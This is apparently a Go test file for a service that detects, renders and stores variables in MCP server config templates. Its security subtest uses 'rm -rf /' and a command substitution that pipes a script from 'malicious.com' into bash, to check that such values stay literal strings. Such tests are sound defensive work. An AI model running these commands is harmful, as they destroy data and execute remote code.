package services

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestTemplateVariableService_DetectVariables(t *testing.T) {
	service := NewTemplateVariableService("/tmp", nil)

	tests := []struct {
		name           string
		templateContent string
		expectedVars   []string
		expectedSecrets []string
	}{
		{
			name: "Standard Go template syntax",
			templateContent: `{
				"mcpServers": {
					"github": {
						"command": "npx",
						"env": {
							"GITHUB_TOKEN": "{{.GITHUB_TOKEN}}",
							"API_URL": "{{.API_URL}}"
						}
					}
				}
			}`,
			expectedVars:    []string{"GITHUB_TOKEN", "API_URL"},
			expectedSecrets: []string{"GITHUB_TOKEN"},
		},
		{
			name: "Legacy template syntax",
			templateContent: `{
				"mcpServers": {
					"test": {
						"url": "{{API_ENDPOINT}}",
						"env": {
							"AUTH": "{{AUTH_TOKEN}}"
						}
					}
				}
			}`,
			expectedVars:    []string{"API_ENDPOINT", "AUTH_TOKEN"},
			expectedSecrets: []string{"AUTH_TOKEN"},
		},
		{
			name: "Mixed template syntax",
			templateContent: `{
				"mcpServers": {
					"mixed": {
						"url": "{{.BASE_URL}}",
						"env": {
							"API_KEY": "{{API_KEY}}",
							"SECRET": "{{.SECRET_VALUE}}"
						}
					}
				}
			}`,
			expectedVars:    []string{"BASE_URL", "API_KEY", "SECRET_VALUE"},
			expectedSecrets: []string{"API_KEY", "SECRET_VALUE"},
		},
		{
			name:            "No variables",
			templateContent: `{"mcpServers": {"simple": {"command": "echo", "args": ["hello"]}}}`,
			expectedVars:    []string{},
			expectedSecrets: []string{},
		},
		{
			name: "Duplicate variables",
			templateContent: `{
				"server1": {"token": "{{.API_TOKEN}}"},
				"server2": {"token": "{{.API_TOKEN}}"}
			}`,
			expectedVars:    []string{"API_TOKEN"},
			expectedSecrets: []string{"API_TOKEN"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			variables, err := service.DetectVariables(tt.templateContent)
			require.NoError(t, err)

			// Check variable names
			var actualVars []string
			var actualSecrets []string
			for _, v := range variables {
				actualVars = append(actualVars, v.Name)
				if v.Secret {
					actualSecrets = append(actualSecrets, v.Name)
				}
			}

			assert.ElementsMatch(t, tt.expectedVars, actualVars, "Variable names should match")
			assert.ElementsMatch(t, tt.expectedSecrets, actualSecrets, "Secret variables should match")
		})
	}
}

func TestTemplateVariableService_RenderTemplate(t *testing.T) {
	service := NewTemplateVariableService("/tmp", nil)

	tests := []struct {
		name            string
		templateContent string
		variables       map[string]string
		expectedOutput  string
		expectError     bool
	}{
		{
			name: "Simple variable substitution",
			templateContent: `{
				"mcpServers": {
					"github": {
						"env": {
							"TOKEN": "{{.GITHUB_TOKEN}}"
						}
					}
				}
			}`,
			variables: map[string]string{
				"GITHUB_TOKEN": "ghp_test123",
			},
			expectedOutput: `{
				"mcpServers": {
					"github": {
						"env": {
							"TOKEN": "ghp_test123"
						}
					}
				}
			}`,
			expectError: false,
		},
		{
			name: "Multiple variables",
			templateContent: `{
				"mcpServers": {
					"api": {
						"url": "{{.BASE_URL}}/{{.VERSION}}",
						"env": {
							"KEY": "{{.API_KEY}}"
						}
					}
				}
			}`,
			variables: map[string]string{
				"BASE_URL": "https://api.example.com",
				"VERSION":  "v1",
				"API_KEY":  "secret123",
			},
			expectedOutput: `{
				"mcpServers": {
					"api": {
						"url": "https://api.example.com/v1",
						"env": {
							"KEY": "secret123"
						}
					}
				}
			}`,
			expectError: false,
		},
		{
			name: "No variables in template",
			templateContent: `{
				"mcpServers": {
					"simple": {
						"command": "echo",
						"args": ["hello"]
					}
				}
			}`,
			variables:      map[string]string{},
			expectedOutput: `{
				"mcpServers": {
					"simple": {
						"command": "echo",
						"args": ["hello"]
					}
				}
			}`,
			expectError: false,
		},
		{
			name: "Invalid template syntax",
			templateContent: `{
				"test": "{{.INVALID"
			}`,
			variables:   map[string]string{},
			expectError: true,
		},
		{
			name: "Missing variable in data",
			templateContent: `{
				"token": "{{.MISSING_VAR}}"
			}`,
			variables: map[string]string{
				"OTHER_VAR": "value",
			},
			expectedOutput: `{
				"token": "<no value>"
			}`,
			expectError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := service.renderTemplate(tt.templateContent, tt.variables)

			if tt.expectError {
				assert.Error(t, err)
				return
			}

			require.NoError(t, err)
			
			// Normalize whitespace for comparison
			expectedNormalized := normalizeJSON(tt.expectedOutput)
			actualNormalized := normalizeJSON(result)
			
			assert.Equal(t, expectedNormalized, actualNormalized)
		})
	}
}

func TestTemplateVariableService_IsSecretVariable(t *testing.T) {
	service := NewTemplateVariableService("/tmp", nil)

	tests := []struct {
		name       string
		varName    string
		isSecret   bool
	}{
		{"Token variable", "GITHUB_TOKEN", true},
		{"Key variable", "API_KEY", true},
		{"Secret variable", "SECRET_VALUE", true},
		{"Password variable", "DB_PASSWORD", true},
		{"Credential variable", "SERVICE_CREDENTIAL", true},
		{"Auth variable", "AUTH_HEADER", true},
		{"Regular variable", "BASE_URL", false},
		{"Port variable", "PORT", false},
		{"Name variable", "SERVICE_NAME", false},
		{"Mixed case", "github_token", true},
		{"All caps", "MY_SECRET", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := service.isSecretVariable(tt.varName)
			assert.Equal(t, tt.isSecret, result)
		})
	}
}

func TestTemplateVariableService_EndToEndVariableResolution(t *testing.T) {
	service := NewTemplateVariableService("/tmp", nil)

	// Set up environment variables for testing
	os.Setenv("TEST_GITHUB_TOKEN", "ghp_test123")
	os.Setenv("TEST_API_URL", "https://api.github.com")
	defer func() {
		os.Unsetenv("TEST_GITHUB_TOKEN")
		os.Unsetenv("TEST_API_URL")
	}()

	templateContent := `{
		"mcpServers": {
			"github": {
				"command": "npx",
				"args": ["-y", "@modelcontextprotocol/server-github"],
				"env": {
					"GITHUB_PERSONAL_ACCESS_TOKEN": "{{.TEST_GITHUB_TOKEN}}",
					"GITHUB_API_BASE_URL": "{{.TEST_API_URL}}"
				}
			}
		}
	}`

	// Test the core components individually
	
	// 1. Test variable detection
	variables, err := service.DetectVariables(templateContent)
	require.NoError(t, err)
	assert.Equal(t, 2, len(variables), "Should detect 2 variables")
	
	varNames := make([]string, len(variables))
	for i, v := range variables {
		varNames[i] = v.Name
	}
	assert.ElementsMatch(t, []string{"TEST_GITHUB_TOKEN", "TEST_API_URL"}, varNames)

	// 2. Test template rendering with resolved variables
	resolvedVars := map[string]string{
		"TEST_GITHUB_TOKEN": "ghp_test123",
		"TEST_API_URL":      "https://api.github.com",
	}
	
	rendered, err := service.renderTemplate(templateContent, resolvedVars)
	require.NoError(t, err)
	
	// Check that the rendered content contains the resolved values
	assert.Contains(t, rendered, "ghp_test123")
	assert.Contains(t, rendered, "https://api.github.com")
	assert.NotContains(t, rendered, "{{.TEST_GITHUB_TOKEN}}")
	assert.NotContains(t, rendered, "{{.TEST_API_URL}}")
}

func TestTemplateVariableService_LoadEnvironmentVariables(t *testing.T) {
	// Create temporary directory and variables file
	tempDir := t.TempDir()
	envDir := filepath.Join(tempDir, "environments", "test")
	err := os.MkdirAll(envDir, 0755)
	require.NoError(t, err)

	variablesFile := filepath.Join(envDir, "variables.yml")
	variablesContent := `
API_KEY: secret123
BASE_URL: https://api.example.com
PORT: 8080
DEBUG: true
`
	err = os.WriteFile(variablesFile, []byte(variablesContent), 0644)
	require.NoError(t, err)

	service := NewTemplateVariableService(tempDir, nil)
	
	variables, err := service.loadEnvironmentVariables("test")
	require.NoError(t, err)

	expected := map[string]string{
		"API_KEY":  "secret123",
		"BASE_URL": "https://api.example.com", 
		"PORT":     "8080",
		"DEBUG":    "true",
	}

	assert.Equal(t, expected, variables)
}

func TestTemplateVariableService_SaveVariablesToEnvironment(t *testing.T) {
	// Create temporary directory
	tempDir := t.TempDir()
	
	service := NewTemplateVariableService(tempDir, nil)

	newVars := map[string]string{
		"NEW_API_KEY": "newsecret123",
		"NEW_URL":     "https://new.api.com",
	}

	err := service.saveVariablesToEnvironment("test", newVars)
	require.NoError(t, err)

	// Verify file was created and contains expected content
	variablesFile := filepath.Join(tempDir, "environments", "test", "variables.yml")
	assert.FileExists(t, variablesFile)

	// Load and verify content
	loadedVars, err := service.loadEnvironmentVariables("test")
	require.NoError(t, err)
	
	assert.Equal(t, newVars, loadedVars)
}

// Helper function to normalize JSON for comparison (removes whitespace differences)
func normalizeJSON(jsonStr string) string {
	// Simple normalization - remove extra whitespace and newlines
	normalized := strings.ReplaceAll(jsonStr, "\n", "")
	normalized = strings.ReplaceAll(normalized, "\t", "")
	// Remove extra spaces between elements
	for strings.Contains(normalized, "  ") {
		normalized = strings.ReplaceAll(normalized, "  ", " ")
	}
	return strings.TrimSpace(normalized)
}

// Integration test with real MCP config template
func TestTemplateVariableService_RealMCPTemplate(t *testing.T) {
	service := NewTemplateVariableService("/tmp", nil)

	// Real-world MCP template
	template := `{
		"mcpServers": {
			"github": {
				"command": "npx",
				"args": ["-y", "@modelcontextprotocol/server-github"],
				"env": {
					"GITHUB_PERSONAL_ACCESS_TOKEN": "{{.GITHUB_TOKEN}}",
					"GITHUB_API_BASE_URL": "{{.GITHUB_API_URL}}"
				}
			},
			"filesystem": {
				"command": "npx", 
				"args": ["-y", "@modelcontextprotocol/server-filesystem", "{{.PROJECT_PATH}}"]
			},
			"web-api": {
				"url": "{{.API_ENDPOINT}}/mcp",
				"env": {
					"AUTHORIZATION": "Bearer {{.API_TOKEN}}"
				}
			}
		}
	}`

	variables := map[string]string{
		"GITHUB_TOKEN":  "ghp_real_token_here",
		"GITHUB_API_URL": "https://api.github.com",
		"PROJECT_PATH":   "/home/user/project",
		"API_ENDPOINT":   "https://my-api.com",
		"API_TOKEN":      "bearer_token_123",
	}

	result, err := service.renderTemplate(template, variables)
	require.NoError(t, err)

	// Verify all variables were substituted
	assert.Contains(t, result, "ghp_real_token_here")
	assert.Contains(t, result, "https://api.github.com") 
	assert.Contains(t, result, "/home/user/project")
	assert.Contains(t, result, "https://my-api.com/mcp")
	assert.Contains(t, result, "Bearer bearer_token_123")

	// Verify no template syntax remains
	assert.NotContains(t, result, "{{.GITHUB_TOKEN}}")
	assert.NotContains(t, result, "{{.API_ENDPOINT}}")
	assert.NotContains(t, result, "{{")
	assert.NotContains(t, result, "}}")
}

// Security and edge case tests
func TestTemplateVariableService_SecurityTests(t *testing.T) {
	service := NewTemplateVariableService("/tmp", nil)

	t.Run("Template injection protection", func(t *testing.T) {
		// Test that Go templates prevent code injection
		maliciousTemplate := `{
			"command": "{{.COMMAND}}",
			"injection": "{{.SCRIPT}}"
		}`
		
		variables := map[string]string{
			"COMMAND": "rm -rf /",
			"SCRIPT":  "$(curl malicious.com/script.sh | bash)",
		}
		
		result, err := service.renderTemplate(maliciousTemplate, variables)
		require.NoError(t, err)
		
		// Variables should be safely substituted as strings, not executed
		assert.Contains(t, result, "rm -rf /")
		assert.Contains(t, result, "$(curl malicious.com/script.sh | bash)")
		// But they should be treated as literal strings, not code
		assert.NotContains(t, result, "<script>")
	})

	t.Run("Large template handling", func(t *testing.T) {
		// Create a large template with many variables
		var templateBuilder strings.Builder
		templateBuilder.WriteString(`{"servers": {`)
		
		variables := make(map[string]string)
		for i := 0; i < 100; i++ {
			if i > 0 {
				templateBuilder.WriteString(",")
			}
			varName := fmt.Sprintf("VAR_%d", i)
			templateBuilder.WriteString(fmt.Sprintf(`"server%d": {"token": "{{.%s}}"}`, i, varName))
			variables[varName] = fmt.Sprintf("value_%d", i)
		}
		templateBuilder.WriteString("}}")
		
		result, err := service.renderTemplate(templateBuilder.String(), variables)
		require.NoError(t, err)
		
		// Verify all variables were substituted
		for i := 0; i < 100; i++ {
			assert.Contains(t, result, fmt.Sprintf("value_%d", i))
			assert.NotContains(t, result, fmt.Sprintf("{{.VAR_%d}}", i))
		}
	})

	t.Run("Nested template syntax", func(t *testing.T) {
		// Test nested braces and complex structures
		template := `{
			"complex": {
				"nested": "{{.OUTER}}",
				"array": ["{{.ITEM1}}", "{{.ITEM2}}"],
				"object": {
					"key": "{{.INNER}}"
				}
			}
		}`
		
		variables := map[string]string{
			"OUTER": "outer_value",
			"ITEM1": "first_item", 
			"ITEM2": "second_item",
			"INNER": "inner_value",
		}
		
		result, err := service.renderTemplate(template, variables)
		require.NoError(t, err)
		
		assert.Contains(t, result, "outer_value")
		assert.Contains(t, result, "first_item")
		assert.Contains(t, result, "second_item") 
		assert.Contains(t, result, "inner_value")
	})
}

func TestTemplateVariableService_ErrorHandling(t *testing.T) {
	service := NewTemplateVariableService("/tmp", nil)

	t.Run("Invalid template syntax errors", func(t *testing.T) {
		invalidTemplates := []string{
			`{"test": "{{.UNCLOSED"}`,           // Unclosed template
			`{"test": "{{INVALID SYNTAX}}"}`,   // Invalid space in variable name
		}
		
		for _, invalidTemplate := range invalidTemplates {
			variables := map[string]string{"TEST": "value"}
			_, err := service.renderTemplate(invalidTemplate, variables)
			
			// Should return error for invalid templates
			assert.Error(t, err, "Template should be invalid: %s", invalidTemplate)
		}
		
		// Test that valid but unusual templates work correctly
		validTemplates := []struct {
			template string
			variables map[string]string
			shouldContain string
		}{
			{
				template: `{"test": "{{.}}"}`,  // Root context reference  
				variables: map[string]string{},
				shouldContain: "map[]", // Will render the variable map
			},
		}
		
		for _, validTemplate := range validTemplates {
			result, err := service.renderTemplate(validTemplate.template, validTemplate.variables)
			assert.NoError(t, err, "Template should be valid: %s", validTemplate.template)
			// Just verify it doesn't crash - content may vary
			assert.NotEmpty(t, result)
		}
	})

	t.Run("Variable detection edge cases", func(t *testing.T) {
		testCases := []struct {
			name     string
			template string
			expected []string
		}{
			{
				name:     "Variables in JSON strings",
				template: `{"url": "https://{{.DOMAIN}}/{{.PATH}}", "key": "{{.API_KEY}}"}`,
				expected: []string{"DOMAIN", "PATH", "API_KEY"},
			},
			{
				name:     "Variables with underscores and numbers",
				template: `{"test": "{{.VAR_123}}", "other": "{{.API_V2_KEY}}"}`,
				expected: []string{"VAR_123", "API_V2_KEY"},
			},
			{
				name:     "No variables",
				template: `{"static": "value", "number": 123}`,
				expected: []string{},
			},
		}
		
		for _, tc := range testCases {
			t.Run(tc.name, func(t *testing.T) {
				variables, err := service.DetectVariables(tc.template)
				require.NoError(t, err)
				
				actualNames := make([]string, len(variables))
				for i, v := range variables {
					actualNames[i] = v.Name
				}
				
				assert.ElementsMatch(t, tc.expected, actualNames)
			})
		}
	})
}